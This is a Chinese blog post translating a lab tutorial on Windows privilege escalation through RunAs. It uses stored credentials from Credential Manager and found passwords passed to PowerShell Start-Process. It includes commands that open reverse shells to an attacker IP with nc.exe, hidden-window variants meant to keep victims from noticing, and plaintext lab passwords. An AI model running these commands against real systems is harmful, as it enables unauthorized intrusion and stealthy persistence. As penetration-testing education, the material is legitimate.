
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/kqdssheng/p/18751119" title="发布于 2025-03-04 18:39">
    <span role="heading" aria-level="2">Windows 提权-RunAs</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<blockquote>
<p>本文通过 Google 翻译 <a href="https://juggernaut-sec.com/runas/" target="_blank" rel="noopener nofollow">RunAs – Windows Privilege Escalation</a> 这篇文章所产生，本人仅是对机器翻译中部分表达别扭的字词进行了校正及个别注释补充。</p>
</blockquote>
<hr>
<h2 id="导航">导航</h2>
<ul>
<li><a href="#id0" rel="noopener nofollow">0 前言</a></li>
<li><a href="#id1" rel="noopener nofollow">1 通过存储的凭据进行 RunAs 提权</a>
<ul>
<li><a href="#id1.1" rel="noopener nofollow">1.1 手动枚举存储的凭据</a></li>
<li><a href="#id1.2" rel="noopener nofollow">1.2 工具枚举存储的凭据</a>
<ul>
<li><a href="#id1.2.1" rel="noopener nofollow">1.2.1 WinPEAS – 失败！</a></li>
<li><a href="#id1.2.2" rel="noopener nofollow">1.2.2 Seatbelt – 成功！</a></li>
</ul>
</li>
<li><a href="#id1.3" rel="noopener nofollow">1.3 使用存储的凭证执行命令</a></li>
</ul>
</li>
<li><a href="#id2" rel="noopener nofollow">2 通过提供的凭证进行 RunAs 提权</a>
<ul>
<li><a href="#id2.1" rel="noopener nofollow">2.1 使用提供的凭证执行命令 – GUI</a></li>
<li><a href="#id2.2" rel="noopener nofollow">2.2 使用提供的凭证执行命令 – Reverse Shell（普通用户）</a></li>
<li><a href="#id2.3" rel="noopener nofollow">2.3 使用提供的凭证执行命令 – Reverse Shell（管理员用户）</a></li>
</ul>
</li>
</ul>
<hr>
<h2 id="0前言"><strong><div id="id0">0、前言</div></strong></h2>
<p>在这篇文章中，让我们看看如何通过 RunAs 在 Windows 电脑上以其它用户的身份启动程序。我们将展示两种办法利用 RunAs：第一种办法是，根据存储在凭证管理器中的本地管理员凭据进行利用；第二种办法是，根据提供的一组用户凭证进行利用。</p>
<blockquote>
<p>注：RunAs 在此处代表一种功能，不是指 runas.exe 命令。runas.exe 命令只是实现 RunAs 功能的一个实例，而要实现此功能还可以有其它方式，如 PS 脚本、py 脚本等。</p>
</blockquote>
<blockquote>
<p>可以将 RunAs 看作是 Windows 中的 sudo，只不过它的表现并不如 sudo 在 Linux 中那样突出。</p>
</blockquote>
<p>有两种方式可以执行 RunAs：一种是在 cmd.exe 中使用 runas 命令（前提是：需要 <em>用户及密码</em> 或 <em>本地存储的凭据</em>。）；另一种是执行 PowerShell 版本的 RunAs（前提是：需要 <em>用户及密码</em>）。</p>
<blockquote>
<p>在此示例中，假设我们在 FTP 服务器中找到了敏感信息，然后以用户 efrost 的身份在 Windows 10 目标上获得了立足点。</p>
</blockquote>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250304183655295-681548961.png" alt="" loading="lazy"></p>
<h2 id="1通过存储的凭据进行-runas-提权"><strong><div id="id1">1、通过存储的凭据进行 RunAs 提权</div></strong></h2>
<p>在目标主机上站稳脚跟之后，我们应该立即开始手动枚举，以便更好地了解当前的 shell 环境。搜索存储的凭证是首先要执行的手动命令之一，这一点很重要。</p>
<h4 id="11手动枚举存储的凭据"><strong><div id="id1.1">1.1、手动枚举存储的凭据</div></strong></h4>
<p>使用以下命令来查找存储的凭证：</p>
<pre><code class="language-cmd">cmdkey /list
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250304183654739-1264959375.png" alt="" loading="lazy"></p>
<p>在这里，可以看到本地管理员账户的凭据已存储在凭据管理器中，可以被用来执行命令。</p>
<h4 id="12工具枚举存储的凭据"><strong><div id="id1.2">1.2、工具枚举存储的凭据</div></strong></h4>
<h6 id="121winpeas--失败"><strong><div id="id1.2.1">1.2.1、WinPEAS – 失败！</div></strong></h6>
<p>市面上有很多后渗透枚举工具，很多都非常棒。但是，对于我们的需求来说，有 winPEAS.exe 基本就够了。</p>
<blockquote>
<p>如果您没有 winPEAS 的副本，可以在<a href="https://github.com/carlospolop/PEASS-ng" target="_blank" rel="noopener nofollow">此处</a>获取。另外再推荐两个工具：<a href="https://github.com/r3motecontrol/Ghostpack-CompiledBinaries" target="_blank" rel="noopener nofollow">Seatbelt.exe</a>、<a href="https://github.com/411Hall/JAWS" target="_blank" rel="noopener nofollow">jaws-enum.ps1</a></p>
</blockquote>
<p>winPEAS 是顶级的枚举工具，能提供海量的信息，信息多到让人难以招架。但最关键的是，要懂得如何从海量信息中的什么地方去查找什么信息。</p>
<p>通常，我们会以不带任何参数的方式运行 winPEAS 以进行“所有检查”，然后再从上到下逐行梳理所有信息。</p>
<p>但在当前这种情况下，<strong>Windows Credentials</strong> 部分才是我们寻找存储凭据最关注的地方。考虑到这一点，我们可以使用 windowscreds 参数以将搜索范围缩小到仅进行 Windows 凭据的检查。</p>
<pre><code class="language-cmd">.\winPEASx64.exe windowscreds
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250304183654044-1147207897.png" alt="" loading="lazy"></p>
<p>有趣的是，winPEAS 并没有找到什么！而这次经历也告诉我们，不应该过分依赖单一工具！</p>
<p>从输出中可以看到，winPEAS 使用的方法与我们手动枚举的方法相同。它提示我们在 winPEAS 失败后可以使用 cmdkey /list 来枚举此内容。</p>
<p>但是，我的确很想展示怎样通过工具来枚举存储的凭据，因此让我们来看一下 Seatbelt.exe 的表现吧。</p>
<h6 id="122seatbelt--成功"><strong><div id="id1.2.2">1.2.2、Seatbelt – 成功！</div></strong></h6>
<p>使用与 winPEAS.exe 非常相似的 Seatbelt.exe 工具，我们可以使用以下命令进行完全扫描（所有检查）：</p>
<pre><code class="language-cmd">.\Seatbelt.exe -group=all -full
</code></pre>
<p>与 winPEAS 类似，我们也可以缩小 Seatbelt 的扫描范围。并且，扫描的范围能缩小到比 winPEAS 更精细的程度。使用 winPEAS 可以缩小到类别，但 Seatbelt 可以缩小到某个类别下面的各子项检查。</p>
<p>例如，如果仅仅只是要检查存储的凭证，则可以使用以下命令：</p>
<pre><code class="language-cmd">.\Seatbelt.exe CredEnum
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250304183653830-564658779.png" alt="" loading="lazy"></p>
<p>在这里，可以看到 Seatbelt 获取的信息与命令 cmdkey /list 获取的信息是相同的。</p>
<h4 id="13使用存储的凭证执行命令"><strong><div id="id1.3">1.3、使用存储的凭证执行命令</div></strong></h4>
<p>在确定本机上存储有本地管理员账户的凭据后，我们就可以利用这些凭据使用 runas.exe 执行命令。</p>
<p>当尝试执行任何非 GUI 的命令（如 notepad 这种就属于 GUI 命令），如 whoami 或类似的 POC 命令时，我们将看不到有任何信息输出。这是因为 runas 是从另外一个“单独的窗口”执行的命令，为此，我们需要将输出重定向到一个文件来读取输出内容。</p>
<blockquote>
<p>注：“单独的窗口”：该窗口能否被看到取决于被执行的命令，对于 whoami 这类命令来说，这个单独的窗口就是一个后台进程，但对于 notepad 这类命令来说，这个单独的窗口就是一个可以看到的文本编辑器。</p>
<p>在 Reverse Shell 环境中执行 <code>runas /savecred /user:admin notepad</code> 这条命令时，这个窗口会出现在受害者的用户桌面环境。</p>
</blockquote>
<blockquote>
<p>runas 命令并不是被用来运行单个命令的，而是用来生成一个拥有不同账户权限的 shell。</p>
</blockquote>
<p>我们可以使用以下命令将 whoami 命令的输出重定向到文件：</p>
<pre><code class="language-cmd">runas /env /noprofile /savecred /user:JUGG-efrost\administrator "cmd.exe /c whoami &gt; whoami.txt"
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250304183653634-980645492.png" alt="" loading="lazy"></p>
<blockquote>
<p>注：如何在凭证管理器中<strong>添加和使用</strong>用户凭据。首次使用 <code>runas /savecred /user:admin cmd</code> 去执行命令时会被询问用户密码，当密码被正常输入之后，该用户凭据便被添加在凭据管理器中。当下次继续使用该方式 <code>runas /savecred /user:admin cmd</code> 去执行命令便不会再询问用户的密码。</p>
</blockquote>
<p>上图的结果显示，我们当前确实是以本地管理员的身份在运行命令。现在可以使用 runas 来获得反向 shell，可以用多种方式来做到这一点，但在这个例子中，我们将利用 nc.exe 将管理员 shell 推送回攻击者机器。</p>
<p>在攻击者计算机上启动一个 443 端口的监听器，然后就可以执行以下命令来获取 admin shell：</p>
<pre><code class="language-cmd">runas /env /noprofile /savecred /user:JUGG-efrost\administrator "c:\temp\nc.exe 172.16.1.30 443 -e cmd.exe"
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250304183654483-280747638.png" alt="" loading="lazy"></p>
<p>值得一提的是，这可能会在受害者机器上打开 cmd 窗口，导致用户可以轻松关闭它。为此，我们可以使用 PowerShell 从隐藏窗口执行命令，从而增加隐蔽性。这样，受害者那边就不会打开任何窗口，也就不会那么轻松的就杀死我们的 shell。</p>
<pre><code class="language-cmd">runas /env /noprofile /savecred /user:JUGG-efrost\administrator "powershell.exe -w hidden -c c:\temp\nc.exe 172.16.1.30 443 -e cmd.exe"
</code></pre>
<p>此外，如果我们拥有对受害者机器的远程桌面权限，那么便不需要像上面那么麻烦，只需使用以下命令即可。</p>
<pre><code class="language-cmd">runas /env /noprofile /savecred /user:JUGG-efrost\administrator cmd
</code></pre>
<h2 id="2通过提供的凭证进行-runas-提权"><strong><div id="id2">2、通过提供的凭证进行 RunAs 提权</div></strong></h2>
<p>假设当我们在受害者机器上站稳脚跟后，使用 cmdkey /list 命令没有找到任何存储的凭据，但在某个配置文件中找到了一个用户的账户及密码。</p>
<p>此时，本小节所介绍的技术在面对下面这种场景时还是很有用的：</p>
<ul>
<li>找到的账户凭据无法访问任何标准服务（SMB、RDP、WinRM），因此无法以该用户身份登录或获取 shell。</li>
<li>Any situation regarding an account that was added to the local admins group and port 3389 (RDP) is closed.【注：没懂作者这句话和上面那句有什么区别。】</li>
</ul>
<h4 id="21-使用提供的凭证执行命令--gui"><strong><div id="id2.1">2.1 使用提供的凭证执行命令 – GUI</div></strong></h4>
<p>如果我们是通过远程桌面访问的受害者主机而不是反向 shell，那么可以直接使用 runas 命令来执行命令即可。但是，这种方式在反向 shell 中是不起作用的！</p>
<p>不起作用的原因是由于 Window 实施了安全措施。以前，runas 命令支持将用户名和密码的信息直接添加在参数中进行使用，但现在不可以了。</p>
<p>现在 Windows 去掉了 runas 命令中对密码参数的支持，更改为需要与用户交互来请求密码的方式。此外，我们也不能通过使用 echo-pipe 技巧将密码通过管道传输到命令来绕过这一点。</p>
<p>虽然如此，但在 GUI 环境下使用以下命令以其他用户身份生成 cmd shell 还是可以的：</p>
<pre><code class="language-cmd">runas /env /noprofile /user:juggernaut.local\cmarko cmd
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250304183654831-536143865.png" alt="" loading="lazy"></p>
<blockquote>
<p>如果账户未加入域，则 runas 参数中的 <code>/user:juggernaut.local\cmarko</code> 需要更改为 <code>/user:juggernaut\cmarko</code> 或 <code>/user:cmarko</code>。</p>
</blockquote>
<p>以往，可以在命令中直接传递密码。但当我们尝试这样做时，会发现该选项已不再可用，并会弹出帮助页面。</p>
<pre><code class="language-cmd">runas /env /noprofile /user:juggernaut.local\cmarko "N0cturn@l21" cmd
</code></pre>
<p>帮助页面告诉我们，现在只能在出现提示时输入用户的密码。</p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250304183654363-1969912886.png" alt="" loading="lazy"></p>
<h4 id="22使用提供的凭证执行命令--reverse-shell普通用户"><strong><div id="id2.2">2.2、使用提供的凭证执行命令 – Reverse Shell（普通用户）</div></strong></h4>
<p>在本例中，假设目标计算机已关闭 RDP，而我们通过反向 shell 得到了一个用户名和密码，而反向 shell 又是非交互式的。这意味着，如果当前用户没有 GUI 访问权限，我们便无法像上面那样使用 runas 来执行命令了。</p>
<p>而要绕过这个问题，我们可以求助于 PowerShell！</p>
<blockquote>
<p>在反向 cmd shell 中运行 powershell -ep bypass 并不总是能成功进入到 powershell 会话，在大多数时候，这会导致 cmd shell 挂起和死机。如果遇到这种情况，我们可以使用 <a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1" target="_blank" rel="noopener nofollow">Nishang</a> 的 PowerShell 反向 TCP 脚本来获取 PowerShell  会话。</p>
</blockquote>
<blockquote>
<p>注：<a href="https://github.com/antonioCoco/RunasCs" target="_blank" rel="noopener nofollow">RunasCs</a> 工具亦可实现带密码的 runas 效果。</p>
</blockquote>
<p>借助 PowerShell，我们可以使用变量安全地存储找到的凭据，然后将变量传递到 Start-Process cmdlet 中。而这与 runas 命令的效果是相同的，只是不会有交互式密码提示，并且它将完全在反向 shell 中工作！</p>
<p>再次在 443 端口启动监听器，然后依次执行以下 3 条命令：</p>
<pre><code class="language-powershell">$secpasswd = ConvertTo-SecureString "N0cturn@l21" -AsPlainText -Force
$mycreds = New-Object System.Management.Automation.PSCredential ("juggernaut.local\cmarko", $secpasswd)
Start-Process -FilePath powershell.exe -argumentlist "C:\temp\nc.exe 172.16.1.30 443 -e cmd.exe" -Credential $mycreds
</code></pre>
<ul>
<li>第一个变量是密码（secpasswd）。</li>
<li>第二个变量是将密码分配给用户名（mycreds）。</li>
<li>第三行是要使用存储凭证运行的命令。</li>
</ul>
<p>执行后，我们将以获得一个 cmd shell。</p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250304183654629-1163943706.png" alt="" loading="lazy"></p>
<p>同样的，就像之前一样，我们要隐藏可能出现在受害者控制台界面的窗口，以防受害者可以轻松的将桌面弹出的窗口给关闭掉。因此，可以将上面的  Start-Process 命令更改为以下命令：</p>
<pre><code class="language-powershell">Start-Process -FilePath powershell.exe -argumentlist "-w hidden -c C:\temp\nc.exe 172.16.1.30 443 -e cmd.exe" -Credential $mycreds
</code></pre>
<p>现在可以以此用户的身份枚举系统，并希望能够进一步提升我们的权限。</p>
<h4 id="23使用提供的凭证执行命令--reverse-shell管理员用户"><strong><div id="id2.3">2.3、使用提供的凭证执行命令 – Reverse Shell（管理员用户）</div></strong></h4>
<p>在本例中，假设我们获取到了本地管理员组中的用户凭据，但该用户并不是内置管理员 administrator。此时，当我们使用上述 PowerShell runas 命令时，我们得到的其实是一个中完整性 shell。</p>
<blockquote>
<p>注：本小节和<a href="#id2.2" rel="noopener nofollow">上一小节 2.2</a>的利用方式其实是一样的，唯一的区别就只是本小节还需要进行 UAC 绕过的操作（但 UAC 绕过的操作作者并未赘述）。</p>
</blockquote>
<p>这是 UAC 造成的结果。对于内置管理员账户，如果打开 cmd.exe，默认情况下会出现管理员提示。但是，如果你有一个本地管理员组中的用户，但不是内置的管理员账户，要获得管理员提示，你需要用 "以管理员身份运行 "打开 cmd.exe。如果我们只用该用户打开 cmd.exe，而不以管理员身份运行，则会得到一个标准的中完整性 shell。</p>
<p>让我们看看它的实际效果。使用命令 net localgroup administrators ，可以看到用户 vcreed 是此主机上的本地管理员。</p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250304183654247-396458941.png" alt="" loading="lazy"></p>
<p>我们在端口 443 上启动另一个监听器，然后加载以下变量并执行 runas 命令。</p>
<pre><code class="language-powershell">$secpasswd = ConvertTo-SecureString "Dfaster1!23" -AsPlainText -Force
$mycreds = New-Object System.Management.Automation.PSCredential ("juggernaut.local\vcreed", $secpasswd)
Start-Process -FilePath powershell.exe -argumentlist "C:\temp\nc.exe 172.16.1.30 443 -e cmd.exe" -Credential $mycreds
</code></pre>
<p>执行上述命令后，我们在监听器窗口获得了一个 vcreed 身份的 shell。</p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250304183654415-2013753551.png" alt="" loading="lazy"></p>
<p>但是，当使用 whoami /priv 检查我们的权限时，会发现此时处于中完整性 shell 中，并且没有管理权限。</p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250304183654481-1436334239.png" alt="" loading="lazy"></p>
<p>从这里开始，我们需要对该用户进行 UAC 绕过，以将其从中完整性 shell 提升到高完整性 shell。</p>
<blockquote>
<p>要了解如何使用 UAC 绕过以从中完整性 shell 提升到高完整性 shell，请在<a href="https://www.cnblogs.com/kqdssheng/p/18745249" target="_blank">此处</a>查看有关该主题的文章。</p>
</blockquote>

</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0.40083732550462964" data-date-created="BlogServer.Application.Dto.BlogPost.BlogPostDto" data-date-updated="2025-03-04 18:39">2025-03-04 18:39</span>&nbsp;
<a href="https://www.cnblogs.com/kqdssheng">扛枪的书生</a>&nbsp;
阅读(<span id="post_view_count">43</span>)&nbsp;
评论(<span id="post_comment_count">0</span>)&nbsp;
<a href="https://i.cnblogs.com/EditPosts.aspx?postid=18751119" rel="nofollow">编辑</a>&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(18751119);return false;">收藏</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '18751119', targetLink: 'https://www.cnblogs.com/kqdssheng/p/18751119', title: 'Windows 提权-RunAs' })">举报</a>
</div>
        